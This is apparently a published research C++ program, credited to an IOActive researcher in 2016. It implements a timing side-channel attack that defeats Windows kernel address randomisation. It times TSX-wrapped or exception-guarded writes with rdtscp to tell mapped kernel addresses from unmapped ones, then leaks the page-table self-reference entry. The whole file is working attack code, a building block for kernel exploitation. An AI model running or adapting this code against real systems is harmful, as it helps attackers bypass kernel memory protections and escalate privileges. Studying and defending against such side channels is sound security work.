// enrique.nissim@IOActive.com Copyright (C) 2016

//Copyright(C) 2016 Enrique Nissim

//This program is free software; you can redistribute it and/or
//modify it under the terms of the GNU General Public License
//as published by the Free Software Foundation.

//This program is distributed in the hope that it will be useful,
//but WITHOUT ANY WARRANTY; without even the implied warranty of
//MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the
//GNU General Public License for more details.

//You should have received a copy of the GNU General Public License
//along with this program; if not, write to the Free Software
//Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

// ASLRSideChannelAttack.cpp : Defines the entry point for the console application.

#include "SideChannel.h"

////////////////////////////////////////////////////////

#define GET_INDEX(va)  ( ((va >> 39) & 0x1ff )) 

bool comp_function(int i, int j) { return (i<j); }

#pragma optimize( "", off )
UINT64 side_channel_tsx(PVOID lpAddress) {
	UINT64 begin = 0;
	UINT64 difference = 0;
	int status = 0;

	unsigned int tsc_aux1 = 0;
	unsigned int tsc_aux2 = 0;
	begin = __rdtscp(&tsc_aux1);
	if ((status = _xbegin()) == _XBEGIN_STARTED) {
		*(char *)lpAddress = 0x00;
		difference = __rdtscp(&tsc_aux2) - begin;
		_xend();
	}
	else {
		difference = __rdtscp(&tsc_aux2) - begin;
	}
	//printf("Begin: %llx\n", begin);
	//printf("difference: %08f\n", tsc_aux2 - tsc_aux1);
	return difference;
}

UINT64 side_channel_exception(PVOID lpAddress) {
	UINT64 begin = 0;
	UINT64 difference = 0;

	unsigned int tsc_aux1 = 0;
	unsigned int tsc_aux2 = 0;
	__try {
		begin = __rdtscp(&tsc_aux1);
		*(char *)lpAddress = 0x00;
		difference = __rdtscp(&tsc_aux2) - begin;
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		difference = __rdtscp(&tsc_aux2) - begin;
	}
	//printf("Begin: %llx\n", begin);
	//printf("difference: %08f\n", tsc_aux2 - tsc_aux1);
	return difference;
}

#pragma optimize( "", on )

float get_average(PVOID lpAddress, UINT iterations) {
	float result = 0;
	for (int i = 0; i < iterations; i++) {
		result += pfn_side_channel(lpAddress);
	}
	result = result / iterations;
	//printf("Average: %08f\n", result);
	return result;
}

void CreateKnownMapped(void) {
	DWORD oldProtect = 0;
	KNOWN_MAPPED = VirtualAlloc(NULL, PAGE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memset(KNOWN_MAPPED, 0xCC, PAGE_SIZE);
	VirtualProtect(KNOWN_MAPPED, PAGE_SIZE, PAGE_READONLY, &oldProtect);
}

void ReleaseKnownMapped(void) {
	VirtualFree(KNOWN_MAPPED, PAGE_SIZE, MEM_RELEASE);
}


void initialize_pml4_array(void) {
	UINT64 virtualAddress = 0;
	PPML4_SELF_REF p = NULL;
	for (int i = 0x100; i < 0x200; i++) {
		virtualAddress =
			((UINT64)0xFFFF << 48) | 
			((UINT64)i << 39) | 
			((UINT64)i << 30) | 
			((UINT64)i << 21) | 
			((UINT64)i << 12) | 
			((UINT64)i * 8);
		p = (PPML4_SELF_REF)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PML4_SELF_REF));
		p->VirtualAddress = virtualAddress;
		p->Index = GET_INDEX(virtualAddress);
		p->UnamppedCount = 0;

		pml4_self_ref_potential_array.push_back(p);
	}
}

int _get_number_of_processors(void) {
	SYSTEM_INFO sysinfo = { 0 };
	GetSystemInfo(&sysinfo);
	return sysinfo.dwNumberOfProcessors;
}

void set_thread_priority(void) {
	SetThreadPriority(GetCurrentThread(), 31);
}

void set_processor_affinity(void) {
	GROUP_AFFINITY affinity = { 0 };
	affinity.Group = _get_number_of_processors() - 1;
	affinity.Mask = 1;
	SetThreadGroupAffinity(GetCurrentThread(), &affinity, NULL);
}


float get_median(PVOID lpAddress) {
	std::vector<float> probe_vector;
	for (int i = 0; i < MEDIAN_SAMPLES; i++) {
		probe_vector.push_back(get_average(lpAddress, ITERATIONS));
	}
	std::sort(probe_vector.begin(), probe_vector.end(), comp_function);
	return probe_vector.at(MEDIAN_SAMPLES / 2);
	//return probe_vector.at(0);
}

float get_median_with_hint(PVOID lpAddress, float hint_unmapped, float hint_mapped) {
	float value = get_median(lpAddress);
	while ((abs(value - hint_mapped) > DIFFERENCE_THRESHOLD) && (abs(value - hint_unmapped) > DIFFERENCE_THRESHOLD))
	{
		printf("\rTime difference exceed for %llx, retrying...\n", lpAddress);
		ConsistencyCounter++;
		if (ConsistencyCounter >= MAX_MISTAKES) return 0;
		value = get_median(lpAddress);
	}
	return value;
}

void fill_tlb_of_potential_pml4(void) {
	// This function will reference all the potential Self-Ref VirtualAddresses
	// in order to fill the TLB
	for (std::vector<PPML4_SELF_REF>::iterator it = pml4_self_ref_potential_array.begin();
		it != pml4_self_ref_potential_array.end();
		++it)
	{
		__try {
			*(PVOID *)((*it)->VirtualAddress) = 0x00;
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {}
	}
}

UINT64 get_pxe_address(UINT64 address, UINT entry) {
	UINT64 result = address >> 9;
	UINT64 lower_boundary = ((UINT64)0xFFFF << 48) | ((UINT64)entry << 39);
	UINT64 upper_boundary = (((UINT64)0xFFFF << 48) | ((UINT64)entry << 39) + 0x8000000000 - 1) & 0xFFFFFFFFFFFFFFF8;
	result = result | lower_boundary;
	result = result & upper_boundary;
	return result;
}

void alloc_probing_pages(void) {
	PVOID p = NULL;
	for (int i = 0; i < NUMBER_OF_PAGE_PROBES; i++) {
		p = VirtualAlloc(NULL, PAGE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		printf("Allocation %d: %p\n", i, p);
		memset(p, 0x41, PAGE_SIZE);
		v_pages.push_back(p);
	}
	p = VirtualAlloc((LPVOID)MAGIC_ADDRESS, PAGE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memset(p, 0x41, 1);
	v_pages.push_back(p);
}

void dealloc_probing_pages(void) {
	for (std::vector<PVOID>::iterator it = v_pages.begin(); it != v_pages.end(); ++it) {
		VirtualFree(*it, PAGE_SIZE, MEM_RELEASE);
	}
	v_pages.clear();
}

void print_pml4_self_ref_final_array_content(void) {

	// Print content of pml4_self_ref_final_array
	for (std::vector<PPML4_SELF_REF>::iterator it = pml4_self_ref_final_array.begin();
		it != pml4_self_ref_final_array.end();
		++it)
	{
		printf("PML4e: %p - Index: %03x\n", (*it)->VirtualAddress, (*it)->Index);
	}
}

BOOL verify_pml4_self_ref_entry(PPML4_SELF_REF pml4_self_ref, float unmapped_time, float mapped_time) {
	// Test for mapped/unmapped for every page that was allocated
	// based on the given potential pml4_self_ref entry 
	UINT64 entry = pml4_self_ref->Index;
	UINT64 pte = 0;
	float med_x;
	printf("Potential SelfRef: %p\n", pml4_self_ref->VirtualAddress);
	for (std::vector<PVOID>::iterator page = v_pages.begin(); page != v_pages.end(); ++page) {
		pte = get_pxe_address((UINT64)*page, entry);
		med_x = get_median_with_hint((PVOID)pte, unmapped_time, mapped_time);
		if (abs(med_x - mapped_time) > DIFFERENCE_THRESHOLD) {
			return FALSE;
		}
		printf("+] PTE %p looks mapped! - Time: %08f\n", pte, med_x);
	}
	return TRUE;
}

BOOL is_va_in_final_array(UINT64 va) {
	for (std::vector<PPML4_SELF_REF>::iterator it = pml4_self_ref_final_array.begin();
		it != pml4_self_ref_final_array.end();
		++it)
	{
		if ((*it)->VirtualAddress == va) {
			return TRUE;
		}
	}
	return FALSE;
}

UINT64 verify_pml4_final_array(float unmapped_time, float mapped_time) {
	UINT64 pte_x = 0;
	UINT64 current_va;
	float med_x;

	for (std::vector<PPML4_SELF_REF>::iterator it = pml4_self_ref_final_array.begin();
		it != pml4_self_ref_final_array.end();
		)//it++
	{
		current_va = (*it)->VirtualAddress;
		med_x = get_median_with_hint((PVOID)current_va, unmapped_time, mapped_time);
		if (ConsistencyCounter >= MAX_MISTAKES) return 0;

		// If the current va is not mapped, then remove it if it reaches MAX_UNMAPPED_TRIES
		if (abs(med_x - mapped_time) > DIFFERENCE_THRESHOLD) {
			(*it)->UnamppedCount += 1;
			if ((*it)->UnamppedCount == MAX_UNMAPPED_TRIES) {
				printf("-] Removing %03x as it seems to be unmapped\n", (*it)->Index);
				HeapFree(GetProcessHeap(), 0, *it);
				it = pml4_self_ref_final_array.erase(it);
			}
		}

		else {
			if (verify_pml4_self_ref_entry(*it, unmapped_time, mapped_time)) {
				// Final decision - This is because the potential presence of dummy(s) pml4e
				print_pml4_self_ref_final_array_content();
				/*
				Let's use and UNMAPPED ADDRESS to decide which one is the correct one
				The fake dummy one will have all mapped, while the real one doesn't
				*/
				pte_x = get_pxe_address(KNOWN_UNMAPPED, (*it)->Index);
				printf("KNOWN_UNMAPPED PTE: %llx\n", pte_x);
				med_x = get_median_with_hint((PVOID)pte_x, unmapped_time, mapped_time);
				if (ConsistencyCounter >= MAX_MISTAKES) return 0;
				if (abs(med_x - mapped_time) <= DIFFERENCE_THRESHOLD) {
					// Erase the pml4e from the final array					
					printf("-] Erasing %03x from final array\n", (*it)->Index);
					//getchar();
					//__debugbreak();
					HeapFree(GetProcessHeap(), 0, *it);
					it = pml4_self_ref_final_array.erase(it);					
				}
				else {
					return (*it)->VirtualAddress;
				}
			} else {
				it++;
			}
		}
	}


	return 0;
}

BOOL veryfy_pml4_entries_forwards(float unmapped_time, float mapped_time) {
	UINT64 real_pml4_self_ref = 0;
	UINT64 current_va = 0;
	fill_tlb_of_potential_pml4();
	float med_x;

	for (std::vector<PPML4_SELF_REF>::iterator it = pml4_self_ref_potential_array.begin();
		it != pml4_self_ref_potential_array.end();
		)//++it)
	{
		current_va = (*it)->VirtualAddress;
		med_x = get_median_with_hint((PVOID)current_va, unmapped_time, mapped_time);
		if (ConsistencyCounter >= MAX_MISTAKES) return FALSE;

		// If the current va is not mapped, then remove it if it reaches MAX_UNMAPPED_TRIES
		if (abs(med_x - mapped_time) > DIFFERENCE_THRESHOLD) {
			(*it)->UnamppedCount += 1;
			if ((*it)->UnamppedCount == MAX_UNMAPPED_TRIES) {
				printf("-] Removing %03x as it seems to be unmapped\n", (*it)->Index);
				HeapFree(GetProcessHeap(), 0, *it);
				it = pml4_self_ref_potential_array.erase(it);
			}
			else {
				it++;
			}
		}

		else {			
			if (verify_pml4_self_ref_entry(*it, unmapped_time, mapped_time)) {
				if (is_va_in_final_array(current_va) == FALSE) {
					printf("+] Removing %03x from initial array and pushing it into final array\n", (*it)->Index);
					pml4_self_ref_final_array.push_back(*it);					
					it = pml4_self_ref_potential_array.erase(it);
				}
				else {
					it++;
				}
			}
			else {
				it++;
			}
		}
	}
	return TRUE;
}

UINT64 LeakPML4(void) {
	UINT64 pte_x = 0;
	UINT64 real_pml4_self_ref = 0;

	float Unmapped_time_initial = get_median((PVOID)KNOWN_UNMAPPED);
	float Mapped_time_initial = get_median((PVOID)KNOWN_MAPPED);

	float Unmapped_time = get_median((PVOID)KNOWN_UNMAPPED);
	float Mapped_time = get_median((PVOID)KNOWN_MAPPED);

	printf("Unmapped Initial: %08f\n", Unmapped_time_initial);
	printf("Mapped Initial: %08f\n", Mapped_time_initial);
	printf("--------------------------\n");

	int counter = 5;

	while ((abs(Unmapped_time - Unmapped_time_initial) > DIFFERENCE_THRESHOLD) ||
		(abs(Mapped_time - Mapped_time_initial > DIFFERENCE_THRESHOLD)) ||
		abs(Mapped_time - Unmapped_time) < (DIFFERENCE_THRESHOLD * 2 + 1) ||
		counter > 0)
	{
		printf("+] Measures are not consistent yet...\n");
		Unmapped_time_initial = Unmapped_time;
		Mapped_time_initial = Mapped_time;
		Unmapped_time = get_median((PVOID)KNOWN_UNMAPPED);
		Mapped_time = get_median((PVOID)KNOWN_MAPPED);
		counter--;
		//Sleep(1000);
	}

	printf("--------------------------\n");
	printf("Unmapped: %08f\n", Unmapped_time);
	printf("Mapped: %08f\n", Mapped_time);
	printf("--------------------------\n");
	printf("\n");

	real_pml4_self_ref = verify_pml4_final_array(Unmapped_time, Mapped_time);
	if (real_pml4_self_ref != 0) {
		return real_pml4_self_ref;
	}

	if (veryfy_pml4_entries_forwards(Unmapped_time, Mapped_time) == FALSE) {
		return 0;
	}

	

	return real_pml4_self_ref;
}

void ReleasePML4SelfRefArray(void) {
	for (std::vector<PPML4_SELF_REF>::iterator it = pml4_self_ref_potential_array.begin();
		it != pml4_self_ref_potential_array.end();
		++it)
	{
		printf("Left in Potential Array: %llx\n", (*it)->VirtualAddress);
		HeapFree(GetProcessHeap(), 0, *it);
	}
	pml4_self_ref_potential_array.clear();

	for (std::vector<PPML4_SELF_REF>::iterator it = pml4_self_ref_final_array.begin();
		it != pml4_self_ref_final_array.end();
		++it)
	{
		printf("Left in Final Array: %llx\n", (*it)->VirtualAddress);
		HeapFree(GetProcessHeap(), 0, *it);
	}
	pml4_self_ref_final_array.clear();
}


//extern "C" __declspec(dllexport) UINT64 GetPML4SelfRef(void)
UINT64 GetPML4SelfRef(void) {

	//pfn_side_channel = side_channel_exception;
	pfn_side_channel = side_channel_tsx;

	// Tested on Core i7-6700K
	DIFFERENCE_THRESHOLD = 15;

	//printf("+] Setting max priority\n");
	//set_thread_priority();
	printf("+] Setting thread affinity to CPU 0\n");
	set_processor_affinity();
	printf("+] Getting all the potential PML4 SelfRef\n");
	initialize_pml4_array();
	printf("+] Mapping a page oracle\n");
	CreateKnownMapped();

	printf("+] Allocating probing target pages...\n");	
	alloc_probing_pages();

	printf("--------------------------\n");
	printf("+] Check that Unammped and Mapped values are consistent across several executions!\n");
	printf("--------------------------\n");
	ConsistencyCounter = 0;

	UINT64 PML4SelfRef = LeakPML4();
	while (ConsistencyCounter >= MAX_MISTAKES || PML4SelfRef == 0) {
		ConsistencyCounter = 0;
		PML4SelfRef = LeakPML4();
	}

	printf("Real PML4 SelfRef Found: %llx\n", PML4SelfRef);

	/**
	getchar();
	__debugbreak();
	*/

	ReleaseKnownMapped();
	ReleasePML4SelfRefArray();
	dealloc_probing_pages();

	return PML4SelfRef;
}

int main(void) {
	printf("Result: %llx\n", GetPML4SelfRef());
	
}